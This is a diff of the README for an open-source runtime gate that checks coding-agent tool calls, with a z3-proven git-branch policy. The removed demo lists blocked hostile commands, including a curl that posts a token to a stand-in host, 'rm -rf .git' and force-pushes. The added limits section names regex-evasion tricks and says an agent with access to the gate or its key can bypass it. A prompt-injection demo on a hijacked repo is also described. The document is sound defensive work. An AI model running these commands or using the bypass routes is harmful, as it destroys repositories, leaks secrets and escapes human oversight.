@@ -1,75 +1,96 @@
 # agent-guardrail
 
-**A formally-checked runtime shield for autonomous coding agents. It sits between the agent and your repo, and provably blocks the destructive actions (force-pushing `main`, `rm -rf`, leaking a secret, wiping CI) while letting real work through. The policy verifies *itself*: z3 proves there is no admitted action that mutates protected history, and shows you the exact gap when there is one.**
+[![CI](https://github.com/ss1738/agent-guardrail/actions/workflows/ci.yml/badge.svg)](https://github.com/ss1738/agent-guardrail/actions/workflows/ci.yml)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
-Coding agents (Copilot Workspace, SWE-agent, OpenHands) now open PRs, run shell, and mutate repos on their own. Their safety today rests on the *model behaving*: prompt guardrails and alignment. That is probabilistic and model-dependent: a well-aligned model may refuse a prompt injection; a jailbroken or weaker one won't. **agent-guardrail is the deterministic backstop**. It gates every tool call in the execution path, so a compromised agent is stopped regardless of *why* it issued the action.
+**A runtime gate for autonomous coding agents. It sits in the tool-call path between the agent and your repo and stops the actions that wreck a repository (force-pushing `main`, `rm -rf` the working tree, exfiltrating a secret, wiping CI) while letting normal build and commit work through. The git-branch policy has a machine-checked core: z3 proves it admits no action that rewrites protected-branch history, and it reports the exact gap if you weaken it. The rest of the threat model is enforced by high-precision heuristics, not by proof, and this README is explicit about which is which.**
 
-## The proof (measured, reproducible)
+Coding agents (Copilot Workspace, SWE-agent, OpenHands) now open PRs, run shell, and rewrite git history on their own. Their safety today rests on the model behaving: prompt guardrails and alignment. That is probabilistic and model-dependent. A well-aligned model may refuse a prompt injection; a jailbroken or weaker one will not. agent-guardrail is the deterministic layer that does not depend on the model: it checks every tool call before it runs, so a compromised agent is stopped regardless of why it issued the action.
 
-The same destructive tool-call sequence a hijacked agent emits, run with vs. without the guardrail on a real repo (`demo_compare.py`):
+## What is proven vs. what is heuristic
+
+Being precise about this up front, because it is the whole point:
+
+| Threat | How it is enforced | Guarantee |
+|---|---|---|
+| Force-push / hard-reset / rebase of a protected branch | structured git policy | **machine-checked by z3** (see below) |
+| `rm -rf` of the repo / home / root | regex over the command | heuristic, high-precision, bypassable by obfuscation |
+| Secret written to disk or exfiltrated over the network | regex (secret shape + sink) | heuristic |
+| Emptying a CI workflow file | path + content check | heuristic |
+| Everything else a build/test agent does | default allow | not policed (by design) |
+
+"Heuristic" means it catches the direct forms and is intentionally bypassable by a determined obfuscator (`rm -r -f`, `$IFS`, base64, aliases). It raises the cost of an accident or a naive injection; it is not a sandbox. For hard isolation, pair it with seccomp/gVisor (see "How it compares").
+
+## The demo (measured, reproducible)
+
+The same destructive tool-call sequence a hijacked agent emits, run with and without the gate on a real repo (`demo_compare.py`):
 
 | | `.git` intact | secret on disk | CI config intact | legit fix still applied |
 |---|:---:|:---:|:---:|:---:|
-| **without guardrail** | ✗ destroyed | ✗ leaked | ✗ wiped | ✓ |
-| **with guardrail** | ✓ | ✓ none | ✓ | ✓ |
+| **without the gate** | destroyed | leaked | wiped | yes |
+| **with the gate** | yes | none | yes | yes |
 
-**6 / 6** destructive actions blocked, **2 / 2** legitimate actions allowed, in the real execution path:
+6 of 6 destructive actions blocked, 2 of 2 legitimate actions allowed, in the real execution path.
 
-```
-⛔ git push origin main --force        BLOCK  force-push to protected branch 'main'
-⛔ git reset --hard HEAD~1             BLOCK  history rewrite on protected branch 'main'
-⛔ write config.py (contains ghp_...)    BLOCK  writing a secret to disk
-⛔ curl -X POST evil.example -d ghp_...  BLOCK  secret exfiltration over the network
-⛔ rm -rf .git                         BLOCK  known-destructive shell command
-⛔ empty .github/workflows/ci.yml      BLOCK  wiping CI config
-▶  write calc.py                       ALLOW  (the real fix)
-▶  git add calc.py                     ALLOW
-```
+## The proven core: the policy checks itself for gaps
 
-## Why it's more than an allowlist: the policy verifies itself
-
-A regex allowlist cannot tell you whether it has a gap. This one can. z3 proves, over the symbolic class of git actions:
+A hand-written allowlist cannot tell you whether it has a hole. The git-branch policy can. Using z3, it proves over the symbolic class of git actions:
 
 ```
-guard_allows(a)  ⇒  ¬ mutates_protected_history(a)
+guard_allows(a)  implies  not mutates_protected_history(a)
 ```
 
-with the safety spec written **independently** of the guard (not copied from it, so the result isn't circular). It returns `PROVED`, or a concrete counterexample. Knock out one rule and it finds the exact hole:
+with the safety spec written independently of the guard, not copied from it, so the result is not circular. It returns `PROVED`, or a concrete counterexample. Remove one rule and it finds the exact hole:
 
 ```
-full policy         : PROVED   (nothing admitted mutates protected history)
-drop the rebase rule: HOLE     op=rebase branch=main   ← the gap, found automatically
+full policy          : PROVED   (no admitted action rewrites protected history)
+drop the rebase rule : HOLE     op=rebase branch=main
 ```
 
-## Validated on real repositories
+This guarantee covers the structured git tool-call path only. It does not verify the Python implementation, the regex rules, or the shell parser.
 
-A guardrail that blocks legitimate work gets muted after two pull requests. So it was measured against **2,836 real `run:` commands from 12 trusted repos** (`rust-lang/rust`, `tokio`, `denoland/deno`, `ripgrep`, `cargo`, `ruff`) read-only, nothing executed (`realworld_test.py`):
+## How it compares
+
+| Tool | Layer | Catches | Why this is different |
+|---|---|---|---|
+| git server-side hooks (`pre-receive`) | git server | bad pushes, once they reach the server | agent-guardrail gates the action before it runs locally, and covers file/shell too, not just pushes |
+| seccomp / gVisor | syscall / kernel | syscall-level isolation | strong isolation, but no notion of "protected branch" or "this is a secret"; complementary, not a substitute |
+| OPA / policy engines | request / API | structured policy decisions | general policy, no formal self-check of the policy and no coding-agent action model out of the box |
+| CodeQL / Copilot Autofix | static analysis | vulnerabilities in code | analyses code at rest; says nothing about what an agent does to the repo at runtime |
+| git hooks + a shell allowlist | local | some of the same patterns | cannot prove the policy is gap-free; this is the piece z3 adds |
+
+Short version: this is not a sandbox and not a linter. It is an action-level gate for coding agents, with a formally checked core for the one sub-policy where a proof is tractable. Use it in front of a sandbox, not instead of one.
+
+## Validated for false friction (not for attack detection)
+
+A gate that blocks legitimate work gets turned off after two pull requests, so the thing worth measuring is how often it blocks real developer commands. It was run over **2,836 real `run:` commands from 12 trusted repos** (`rust-lang/rust`, `tokio`, `denoland/deno`, `ripgrep`, `cargo`, `ruff`) read-only, nothing executed (`realworld_test.py`):
 
 | version | false blocks | escalations | allows |
 |---|:---:|:---:|:---:|
 | v0 (fail-closed on any metacharacter) | 2 (both legit CI) | 1854 (65%) | 35% |
-| **v0.1 (threat-model gate)** | **0** | **0** | **100%** |
+| v0.1 (default-allow, block the threat model) | 0 | 0 | 100% |
 
-v0 escalated two-thirds of normal CI and wrongly blocked two real commands (a force-push to a *feature* branch, and the standard `rm -rf /usr/share/dotnet` disk-cleanup). The lesson: a coding agent must run arbitrary build/test commands, so the guardrail **defaults to ALLOW and precisely blocks its defined threat classes** (like a firewall) rather than escalating everything unrecognised. Both former false positives are now regression tests.
+Read this honestly: with a default-allow design, a low false-block rate on legitimate commands is the *target*, not a surprise. What the corpus caught was the opposite failure: v0 was fail-closed and blocked two-thirds of normal CI, plus two legitimate commands (a force-push to a *feature* branch, and the standard `rm -rf /usr/share/dotnet` disk cleanup). The redesign fixed that, and both former false positives are now regression tests. This corpus does **not** measure attack detection; it contains no adversarial commands. Attack behaviour is covered by the demo and the tests, not by this number.
 
-## Honest scope
+## Assumptions and limits
 
-- **Covered by the soundness proof:** git ops (push/reset/rebase on protected branches) and file writes (secrets, CI config). This is where the formal guarantee is real.
-- **The threat model is defined, not total.** The guardrail blocks repo/home/root destruction, secret exfiltration, and protected-branch history rewrite, with high precision (0 false positives on the corpus above). It does **not** police every possible harm: a mass `sed` refactor or a `curl | sh` toolchain install is the agent's legitimate job, caught by normal PR review, not by this gate. One residual: a raw-shell history rewrite naming *no* branch (`git reset --hard HEAD~1`) could hit the current branch, so it **ESCALATE**s to a human; the full guarantee lives on the structured git tool-call path, which real agents use.
-- **A well-aligned agent will often refuse an injection on its own** (in `demo_hijack.py`, a real Claude agent read the planted "maintainer note" and declined it). The guardrail's value is that it does **not depend on that**. It is the deterministic layer for when alignment fails.
-
-Every decision is appended to a tamper-evident HMAC-SHA256 audit chain (`verify_chain()`), so the record of what an agent tried and what was blocked can't be silently rewritten.
+- **The gate must be out-of-process from the agent.** If the agent can edit the guardrail or read the HMAC key, it can bypass or forge. The audit chain is tamper-evident only under the assumption that the key is not accessible to the agent (a wrapper process or separate service, not an in-process import the agent controls). See [THREAT_MODEL.md](THREAT_MODEL.md).
+- **Shell coverage is best-effort.** A determined attacker obfuscates around the regexes. Treat shell blocking as defense-in-depth, not a boundary.
+- **A well-aligned agent will often refuse an injection on its own.** In `demo_hijack.py` a real Claude agent read the planted note and declined it. The gate's value is being the deterministic backstop for when alignment fails.
+- **No agent-framework integration yet.** The gate is a library plus a sandboxed executor; a first-class OpenHands / SWE-agent hook is the next step, not shipped.
 
 ## Run it
 
 ```bash
 pip install z3-solver
-python3 demo_compare.py           # with/without guardrail, on a real repo
+python3 tests/test_guardrail.py   # 10 tests
+python3 demo_compare.py           # with and without the gate, on a real repo
+python3 realworld_test.py         # the 2,836-command friction check (needs gh)
 ANTHROPIC_API_KEY=... python3 demo_hijack.py   # a real Claude agent on a hijacked repo
 ```
 
-## Why this exists
+## Status
 
-Runtime assurance over a black-box decision-maker (proving the *filtered* action is safe no matter how the policy behaves) is the same primitive as a verified safety shield for a robot controller, pointed at a coding agent instead of an actuator. As agents get more autonomous, the deterministic, self-verifying gate is the layer that has to exist.
+Early, single author, honest about scope. Feedback and holes in the policy are welcome, especially holes. See [THREAT_MODEL.md](THREAT_MODEL.md) and [SECURITY.md](SECURITY.md).
 
-MIT © 2026 Satyawan Singh
+MIT License.
